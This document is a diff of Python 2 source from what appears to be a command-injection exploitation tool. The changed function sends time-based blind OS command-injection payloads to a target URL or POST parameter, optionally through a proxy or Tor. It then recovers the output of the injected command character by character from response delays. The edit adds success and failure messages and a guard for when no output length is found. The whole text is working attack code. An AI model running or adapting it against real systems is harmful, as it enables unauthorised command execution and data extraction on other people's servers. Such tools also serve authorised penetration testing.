@@ -141,7 +141,11 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
     minlen = 0
   else:
     minlen = 1
-  print "\n(*) Retrieving the length of execution output..."
+
+  found_chars = False
+  sys.stdout.write("\n(*) Retrieving the length of execution output... ")
+  sys.stdout.flush()  
+
   for output_length in range(int(minlen),int(maxlen)):
     
     if alter_shell:
@@ -253,124 +257,140 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
     if how_long >= delay:
       if menu.options.verbose:
         print "\n"
-      print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters."+ Style.RESET_ALL
-      break
-              
-  num_of_chars = output_length + 1
-  check_start = 0
-  check_end = 0
-  check_start = time.time()
-  
-  output = []
-  for num_of_chars in range(1,int(num_of_chars)):
-    for ascii_char in range(32, 129):
-      
-      if alter_shell:
-        # Get the execution output, of shell execution.
-        payload = tb_payloads.get_char_alter_shell(separator,cmd,num_of_chars,ascii_char,delay,http_request_method)
       else:
-        # Get the execution output, of shell execution.
-        payload = tb_payloads.get_char(separator,cmd,num_of_chars,ascii_char,delay,http_request_method)
-        
-      # Check if defined "--prefix" option.
-      if menu.options.prefix:
-        prefix = menu.options.prefix
-        payload = prefix + payload
-        
-      # Check if defined "--suffix" option.
-      if menu.options.suffix:
-        suffix = menu.options.suffix
-        payload = payload + suffix
+        sys.stdout.write("["+Fore.GREEN+" SUCCEED "+ Style.RESET_ALL+"]\n")
+        sys.stdout.flush()
+      print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters."+ Style.RESET_ALL
+      found_chars = True
+      break
 
-      # Check if defined "--verbose" option.
-      if menu.options.verbose:
-        sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
-        
-      start = 0
-      end = 0
-      start = time.time()
-      
-      if http_request_method == "GET":
-        payload = urllib.quote(payload)
-        target = re.sub(settings.INJECT_TAG, payload, url)
-        vuln_parameter = ''.join(vuln_parameter)
-        request = urllib2.Request(target)
-        
-        # Check if defined extra headers.
-        headers.do_check(request)
-              
-        # Check if defined any HTTP Proxy.
-        if menu.options.proxy:
-          try:
-            response = proxy.use_proxy(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        # Check if defined Tor.
-        elif menu.options.tor:
-          try:
-            response = tor.use_tor(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        else:
-          try:
-            response = urllib2.urlopen(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-            
-      else :
-        parameter = urllib2.unquote(parameter)
-        data = re.sub(settings.INJECT_TAG, payload, parameter)
-        request = urllib2.Request(url, data)
-        
-        # Check if defined extra headers.
-        headers.do_check(request)
-          
-        # Check if defined any HTTP Proxy.
-        if menu.options.proxy:
-          try:
-            response = proxy.use_proxy(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        # Check if defined Tor.
-        elif menu.options.tor:
-          try:
-            response = tor.use_tor(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        else:
-          try:
-            response = urllib2.urlopen(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-                
-      end  = time.time()
-      how_long = int(end - start)
-            
-      if how_long >= delay:
-        if not menu.options.verbose:
-          output.append(chr(ascii_char))
-          percent = ((num_of_chars*100)/output_length)
-          sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(percent)+"% ]")
-          sys.stdout.flush()
-        else:
-          output.append(chr(ascii_char))
-        break
+  if found_chars == True : 
+    num_of_chars = output_length + 1
+    check_start = 0
+    check_end = 0
+    check_start = time.time()
     
-  check_end  = time.time()
-  check_how_long = int(check_end - check_start)
+    output = []
 
-  output = "".join(str(p) for p in output)
-  
+    percent = 0
+    sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(percent)+"% ]")
+    sys.stdout.flush()
+
+    for num_of_chars in range(1,int(num_of_chars)):
+      for ascii_char in range(32, 129):
+        
+        if alter_shell:
+          # Get the execution output, of shell execution.
+          payload = tb_payloads.get_char_alter_shell(separator,cmd,num_of_chars,ascii_char,delay,http_request_method)
+        else:
+          # Get the execution output, of shell execution.
+          payload = tb_payloads.get_char(separator,cmd,num_of_chars,ascii_char,delay,http_request_method)
+          
+        # Check if defined "--prefix" option.
+        if menu.options.prefix:
+          prefix = menu.options.prefix
+          payload = prefix + payload
+          
+        # Check if defined "--suffix" option.
+        if menu.options.suffix:
+          suffix = menu.options.suffix
+          payload = payload + suffix
+
+        # Check if defined "--verbose" option.
+        if menu.options.verbose:
+          sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
+          
+        start = 0
+        end = 0
+        start = time.time()
+        
+        if http_request_method == "GET":
+          payload = urllib.quote(payload)
+          target = re.sub(settings.INJECT_TAG, payload, url)
+          vuln_parameter = ''.join(vuln_parameter)
+          request = urllib2.Request(target)
+          
+          # Check if defined extra headers.
+          headers.do_check(request)
+                
+          # Check if defined any HTTP Proxy.
+          if menu.options.proxy:
+            try:
+              response = proxy.use_proxy(request)
+            except urllib2.HTTPError, err:
+              print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+              raise SystemExit() 
+
+          # Check if defined Tor.
+          elif menu.options.tor:
+            try:
+              response = tor.use_tor(request)
+            except urllib2.HTTPError, err:
+              print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+              raise SystemExit() 
+
+          else:
+            try:
+              response = urllib2.urlopen(request)
+            except urllib2.HTTPError, err:
+              print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+              raise SystemExit() 
+              
+        else :
+          parameter = urllib2.unquote(parameter)
+          data = re.sub(settings.INJECT_TAG, payload, parameter)
+          request = urllib2.Request(url, data)
+          
+          # Check if defined extra headers.
+          headers.do_check(request)
+            
+          # Check if defined any HTTP Proxy.
+          if menu.options.proxy:
+            try:
+              response = proxy.use_proxy(request)
+            except urllib2.HTTPError, err:
+              print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+              raise SystemExit() 
+
+          # Check if defined Tor.
+          elif menu.options.tor:
+            try:
+              response = tor.use_tor(request)
+            except urllib2.HTTPError, err:
+              print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+              raise SystemExit() 
+
+          else:
+            try:
+              response = urllib2.urlopen(request)
+            except urllib2.HTTPError, err:
+              print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+              raise SystemExit() 
+                  
+        end  = time.time()
+        how_long = int(end - start)
+              
+        if how_long >= delay:
+          if not menu.options.verbose:
+            output.append(chr(ascii_char))
+            percent = ((num_of_chars*100)/output_length)
+            sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(percent)+"% ]")
+            sys.stdout.flush()
+          else:
+            output.append(chr(ascii_char))
+          break
+      
+    check_end  = time.time()
+    check_how_long = int(check_end - check_start)
+    output = "".join(str(p) for p in output)
+
+  else:
+    check_start = 0
+    sys.stdout.write("["+Fore.RED+" FAILED "+ Style.RESET_ALL+"]\n")
+    sys.stdout.flush()  
+    check_how_long = 0
+    output = ""
+
   return  check_how_long,output
     
 #eof
